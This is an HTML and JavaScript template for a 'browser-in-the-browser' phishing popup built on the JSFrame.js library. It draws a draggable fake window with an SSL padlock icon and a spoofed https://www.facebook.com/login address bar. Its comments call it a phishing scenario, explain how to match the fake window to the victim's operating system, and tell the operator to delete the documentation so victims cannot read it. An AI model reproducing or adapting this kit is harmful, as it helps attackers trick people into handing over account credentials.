<!DOCTYPE html>
<html>
<meta charset="utf-8">
<head>
<!--This is an empty template with the address bar only (SSL Bar). It's for the people who want to add their own custom page using the popup-->
    <title>JS popup template</title>
    <meta name="description" content="JS popup tempalte.">
<style>
body {
  margin: 0;
  font-family: Arial, Helvetica, sans-serif;
  line-height: 1.28;
  display:flex; 
  flex-direction:column;
  background-color: white;
  -moz-user-select: none;
  -webkit-user-select: none;
  -ms-user-select:none; 
  user-select:none;
  -o-user-select:none;
  overflow: hidden;
}
.wrapper {
	text-align: center;
	top: 50%;
	position: absolute;
	left: 50%;
}

</style>
</head>

<body>
  <script src="static/js/jsframe.js"></script>

<div class="wrapper">
<button type="button" onclick="start()">JS POPUP</button>

      </div>

<script>
/*Please notice that there are two ways for adding a custom page in the JS popup. Either using innerHTML or iframe.
At the momment I'm using innerHTML, Which mean adding the popup page code within the page who will show the popup (More explanation and details bellow).
And the second methode is using iframe which means that the popup will show an external HTML file inside it.
I tried to give a detailled Q&A to respond for all the question that the user can ask.
----------------------------------------------------------------------------------
The questions will cover the differnece between iframe and innerHTML and popup settings.
So the easy one to use is it iframe or innerHTML?
iframe (under certain conditions).
The most efficient one to use ?
Definetly innerHTML.
Why to use iframe?
It does not affect the main html page who will show the popup because in some situations when using innerHTML you'll have some conflicts with the page especially in the CSS. But iframe does not have this issue.
Cons of iframe ?
Lagging when dragging the popup especially when you drag it vertically.
Why to use innerHTML ?
No issue when dragging the popup.
Cons of innerHTML ?
Hard to modify for some unexpericend users.
And like I mentioned before iframe will not have conflicts in the CSS or the html code with the page who'll show the popup but innerHTML will definitely do.
Why then you're not using iframe if it's easy to use ?
Yeah using iframe it's dead simple when creating the code but you'll have a issue which I already mentioned before (The vertical drag lagging does exists but not always and it will happen even in high specs devices). 
When to use iframe? 
iframe is recommended to be used only if the popup will be blocked in its place (unmovable).
Things to know about using iframe ?
To use iframe you need to call an external html file with his CSS (CSS can be external "style.css" or internal "<style></style>" and both of them will work with iframe).  
Which one of them it's recommended to be used ?
Bottom line using iframe is easy to code and easy to use but it will always have a dragging issue.
And innerHTML will not have a problem when dragging the popup but it's complicated to use.
So the recommended one to use is innerHTML because basically we want to drag the popup and this is the whole reason why we even created this phishing scenario.
How to use iframe ?
To use iframe you need to call an html file with his CSS (CSS can be either external "style.css" or internal "<style></style>" and both of them will work).  
To use iframe replace "html: HT" in the popup settings with: "url: location-of-your-html-file.html", And Don't add "" in the popup settings I used them only to show you the parts that I'm talking about.
==============================================================================================================
Even though that using innerHTML is the best choice there are some obligations needs to be satisfied before the popup works :
When to use innerHTML ?
Almost in every situation.
When I can't use innerHTML ?
If you have some unfixable conflicts between the main page code and the popup code.
How to use CSS for innerHTML ?
Unlike iframe, innerHTML needs the CSS to be within the page who contains the popup (The CSS should be added with the CSS of the main page that contains the popup).
Why not to use a whole style.css file with some other name only for the popup to avoid conflicts with the page containg the popup and call it separately?
Sometimes if you're using a stylesheet like this: <link rel="stylesheet" href="static/css/style.css"> and you're calling it for innerHTML it may not work, and we don't want to take any risk that's why it's always recommended that the css of innerHTML to be with the main css of the html page who'll show the popup.
 
How to use innerHTML ?
First, you need to call the page as a constant and adding in the first of each new line ' and on the last of the line ' +  but in the last line you shouldn't add the + .
And Do not add the tags <html> </html> and <head> </head> and <body></body> Plus the code of the popup should start after the <body> tag directly without the <body> tag itself.
The CSS of innerHTML page should be included with the CSS of the page who will show the popup.
If you didn't understand how to use the popup in some part take a look at login.html and see if you could understand better.
===================================================================
Things to know about the popup.
For the apperance of the popup there are two choices either Mac-OS or Windows.
For Mac-OS change the apperance tag with "yosemite" and for the Windows apperance change the tag with "redstone"
if you want the popup to automatically show the appareance based on thier OS take a look about the methode I'm using in login.html file, But I'll explain it here.
First I'm using a JS script reading the user agent header and will do a certain task if the conditions are satisified. in other words:
you need to create two JS functions the first is for the Windows OS and we'll call it eg. function_windows() and the Second one for Mac-OS and we'll call it eg. function_macos() and then if the OS deicovery script found that the connected user is on Windows then script will start function_windows() and if he using Mac-OS then he'll start function_macos()
And like I said before if you're using innerHTML then the code should be called inside a constant so there is a play here. We can set the constant before both functions but inside the JS script so that will give us one constant which gonna work with both functions, in other words we can that will give us a page who gonna work with both OSs and we're doing this to avoid repeating the page in each OS fucntion and we can do a page for each OS so it can be two pages or even more if there more than two fucntions.
And remove all this Documentation once you've created your page because obviously we don't want the connected user to read this.
The source of the used JS library : https://github.com/riversun/JSFrame.js
For further information about using the JS popup check : https://github.com/riversun/JSFrame.js
*/


    function start() {
        const jsFrame = new JSFrame();		
	const HT =  '<div id="navwrapper">' +
'<table border="1" style="width: 100%; border-collapse: collapse; background-color: #fdfdfd;">' +
'<tbody>' +
'<tr style="height: 10px;">' +
'<td style="width: 100%; height: 10px;"><img src="ssl.png" alt="" width="16" height="16" /><span style="color: black; font-size:17px">https://www.facebook.com/login</span></td>' +
'</tr>' +
'</tbody>' +
'</table>' +
'</tbody>' +
'</table>' +
'</form>'	
		const frames = [];

        for (let i = 0; i < 1; i++) {
            const frame = jsFrame.create({
                name: `Win${i}`,
                title: `Popup`,
                left: 20 , top: 50, width: 920, height: 423,
				minWidth: 800, minHeight: 400,
                appearanceName: 'yosemite',
				smoothResizeOnIframe:true,
                style: {
                    overflow: 'hidden'
                },
                html: HT
            }).show();
			

                frame.showFrameComponent('minimizeButton');
                frame.showFrameComponent('zoomButton');
                frame.setMovable(true);
                frame.setResizable(true);


            frame.setControl({
                styleDisplay:'inline',
                maximizeButton: 'zoomButton',
                demaximizeButton: 'dezoomButton',
                minimizeButton: 'minimizeButton',
                deminimizeButton: 'deminimizeButton',
                hideButton: 'closeButton',
                animation: true,
                animationDuration: 150,

            });


            frame.on('zoomButton', 'click', (_frame, evt) => {

               _frame.extra.__restore_info = {
                    org_left: _frame.getLeft(),
                    org_top: _frame.getTop(),
                    org_width: _frame.getWidth(),
                    org_height: _frame.getHeight()
                };

                frame.setPosition(0, 0);
                frame.setSize(window.innerWidth - 2, window.innerHeight - 2, true);

                frame.hideFrameComponent('zoomButton');
                frame.showFrameComponent('dezoomButton');

                frame.setMovable(true);
                frame.setResizable(true);


            });

            frame.on('dezoomButton', 'click', (_frame, evt) => {

                  _frame.setPosition(_frame.extra.__restore_info.org_left, _frame.extra.__restore_info.org_top);

                const force = true;
                _frame.setSize(_frame.extra.__restore_info.org_width, _frame.extra.__restore_info.org_height, force);
                frame.hideFrameComponent('dezoomButton');
                frame.showFrameComponent('zoomButton');

                frame.setMovable(true);
                frame.setResizable(true);


            });



            frame.on('pageButton', 'click', (frame, evt) => {
   	     frame.control.doHide({
                callback: (frame, info) => {               
                    frame.closeFrame();
                }
            });  });

            frame.control.on('hid', (frame, info) => {
                frame.closeFrame();
            });




            frames.push(frame);
        }
        frames[0].requestFocus();
    }

</script>

</body>
</html>